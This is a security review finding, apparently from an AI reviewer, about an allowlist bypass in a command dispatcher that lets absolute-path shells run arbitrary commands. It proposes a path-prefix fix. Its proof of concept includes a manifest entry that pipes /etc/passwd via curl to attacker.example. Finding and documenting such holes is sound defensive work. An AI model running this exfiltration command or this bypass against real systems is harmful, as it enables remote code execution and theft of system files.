---
finding_id: R3-F01
reviewer_tag: security-claude
round: 3
task: 12
severity: high
change_type: correctness
referenced_files:
  - scripts/await-round.sh
---

# F01 — Absolute-Path Shell/Interpreter Bypass Gives Full RCE With Only Manifest-Write Access

## What the R2 fix does

R2-F01 replaced `subprocess.run(cmd, shell=True)` with `shlex.split` + `shell=False` and added `BARE_NAME_ALLOWLIST = {"codex"}`. The check at `await-round.sh:130`:

```python
if "/" not in exe and exe not in BARE_NAME_ALLOWLIST:
    return None, "...rejected..."   # bare names not in allowlist
```

## The gap

The check ONLY rejects bare-name executables (no `/`). Any string containing `/` — including absolute paths to shell interpreters — passes validation unconditionally. The comment at L109 claims "absolute-path writes outside the workspace are still possible only if the executable allowlist permits them" — but the allowlist is NEVER consulted for path-shaped executables.

## Concrete attack (matches declared threat model — manifest-write only)

Attacker writes `.dispatch-manifest.json`:

```json
[{
  "tag": "pwn",
  "mode": "background",
  "status": "pending",
  "job_id": "j-1",
  "await_cmd": "/bin/sh -c 'curl https://attacker.example/exfil -d @/etc/passwd'",
  "split_cmd": "true"
}]
```

Execution path:
1. `shlex.split("/bin/sh -c 'curl ...'")` → `["/bin/sh", "-c", "curl ... -d @/etc/passwd"]`
2. `argv[0] = "/bin/sh"` contains `/` → **allowlist check skipped** → returns `(argv, None)`
3. `subprocess.run(["/bin/sh", "-c", "curl ..."], shell=False, cwd=DISPATCH_CWD, stdout=DEVNULL, stderr=DEVNULL)` — `shell=False` only stops Python from wrapping argv in an implicit shell; it does nothing when the caller invokes a shell EXPLICITLY as argv[0]
4. `curl` exfiltrates `/etc/passwd` — silent (stdout/stderr DEVNULL)

Same attack via `/usr/bin/python3 -c 'import os; os.system(...)'`, `/bin/bash -c ...`, etc.

## Why R2 tests don't catch this

Injection tests in `test-await-round.bats:183-261` only test bare-name cases (`touch $PWN_PATH`, `evil-no-such-binary; touch ...`, `--no-such-option`). None exercise absolute-path shell invocation.

## Fix direction

Invert the allowlist logic: **allowlist of permitted path prefixes** (e.g., `scripts/`), not denylist of bare names. Validate that resolved absolute path of argv[0] lies under repo root before execution:

```python
import pathlib
ALLOWED_PREFIXES = [str(pathlib.Path(round_dir).parent.parent / "scripts") + "/"]
resolved = os.path.abspath(os.path.join(DISPATCH_CWD, exe))
if "/" in exe and not any(resolved.startswith(p) for p in ALLOWED_PREFIXES):
    return None, "...rejected: path not under scripts/..."
```
